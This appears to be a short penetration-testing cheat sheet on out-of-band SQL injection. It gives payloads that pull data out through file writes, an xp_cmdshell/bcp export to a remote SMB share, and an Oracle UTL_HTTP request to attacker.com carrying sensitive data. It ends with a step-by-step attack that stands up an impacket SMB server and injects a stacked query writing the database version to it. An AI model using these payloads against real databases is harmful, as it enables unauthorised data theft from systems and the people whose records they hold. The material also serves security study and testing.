# Out of Band SQL Injection
A technique used to exfiltrate data or execute actions when traditional methods are ineffective.

## MySQL & MariDB
```sql
SELECT data FROM users INTO OUTFILE '/tmp/evil.txt'
UPDATE users SET username = LOAD_FILE('/tmp/evil.txt')
```

## Microsoft SQL (MSSQL)
Write data to a file accessible over network share
```sql
EXEC xp_cmdshell 'bcp "SELECT data FROM users" queryout "\\10.10.10.10\logs\out.txt" -c -T';
```
Other techniques include `OPENROWSET` or `BULK INSERT` 

## Oracle
Send an HTTP request with sensitive data.
```sql
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

# Example Attack

`secure_file_priv`
| Value | Description |
| ----- | ----------- |
| On | Restricts file operations such as `INTO OUTFILE` |
| Off / Empty | Can write files to any location |

## 1. Enable network share on attacking machine
Using impacket run the following command to start an smb share at the `/tmp` directory:
```py
python3.9 smbserver.py -smb2support -comment "Log server" -debug logs /tmp
```

Access the share:
```sh
smbclient //10.10.10.10/logs -U guest -N
ls
```


## 2. Perform Injection
The following inject will place the value of version into a file called `out.txt` in the remote share.
```sql
1'; SELECT @@version INTO OUTFILE '\\\\10.10.10.10\\logs\\out.txt'; --
```

Files will not overwrite. Make sure to use a new output file for each attack attempt.


